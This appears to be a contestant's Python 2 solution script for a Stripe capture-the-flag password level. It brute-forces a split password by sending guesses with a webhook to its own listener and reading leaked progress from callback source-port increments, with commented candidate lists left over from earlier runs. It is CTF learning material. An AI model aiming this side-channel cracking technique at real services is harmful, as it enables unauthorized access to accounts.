import socket
import urllib
import os
import logging

def score_password(s, portno, pw, logging):
  for i in range(1,100):
    try:
      urllib.urlopen('https://level08-4.stripe-ctf.com/user-lxulnzkywg/', '{"password": "baseline", "webhooks":["level02-2.stripe-ctf.com:%d"]}' % portno)
      s2, (host, portBaseline) = s.accept()
      s2.close()
      urllib.urlopen('https://level08-4.stripe-ctf.com/user-lxulnzkywg/', '{"password": "' + pw + '", "webhooks":["level02-2.stripe-ctf.com:%d"]}' % portno)
      s2, (host, portNext) = s.accept()
      s2.close()
      logging.info('Tried: ' + pw + ' on %d' % portno)
      return (portNext - portBaseline)
    except socket.timeout:
      pass

portno=40010
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind(("0.0.0.0", portno))
s.listen(1)
s.settimeout(2)

LOG_FILENAME = '/home/user-yuzpmgidbb/log'
logging.basicConfig(filename=LOG_FILENAME,level=logging.DEBUG,)
logging.info('Starting to work')
#a = [37,40,41,42,85,129,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,244,416,417,418,419,442,443,453,454,455,726,727,728,729,730,731,732,733,734,735,736,778,779,780,781,782,783,784,785,786,787,788,789,790,791,792,793,794,795,796,797,798,799,800,801,802,803,804,805,806,807,808,809,832,833,834,835,836,837,838,839,841,842,843,844,845,846,847,848,849,850,851,852,853,854,855,856,857,858,859,860,861,862,863,864,865,866,867,868,869,870,871,872,873,874,875,876,877,878,879,882,883,884,886,887,888,889,890,891,892,893,894,895,897,898,899,921,922,923,924,925,926,927,930,931,932,933,934,935,936,937,938,941,943,944,945,946,947,948,986,987,988,989,990,991]
#a = [129,219,220,221,222,784,785,786,787,791,792,793,858,861,862,863,864,887,888,889,890,893,894,895,898,899,921,922,924,925,926,927]

#a = [45,46,47,86,89,172,173,174,175,176,177,178,179,180,181,182,183,185,186,187,191,192,204,205,206,207,208,218,251,253,254,255,292,316,521,524,934]

#a = [229,452]

#a = [58,59,60,98,99,100,101,184,186,203,204,205,206,207,208,209,210,212,213,214,215,216,217,218,221,222,223,224,225,226,227,242,243,244,245,246,247,248,259,260,276,277,303,375,384,401,402,406,453,455,456,457,471,472,474,475,513,515,516,517,540,541,543,544,545,548,549,550,616,663,664,666,673,674,698,699,700,702,703,710,719,720,721,722,821,822,838,839,840,841,857,859,863,879,882,906,924,926,939,940,941,942]
a = [516,517,541,543,698,699,700,702]

for i in a:
#for i in range(1,1000):
  for j in range(10):
    if score_password(s, portno, '129934229%03d' % i, logging) <= 5:#4:#3:#2:
      logging.debug(' Score under 2, skip : %03d' % i)
      break
    else:
      if j == 9:
        logging.warning('Candidate: %d' % i)
        print "Candidate: ", i
      if i % 100 == 0:
        print ("Landmark: %d" % i)
s.close()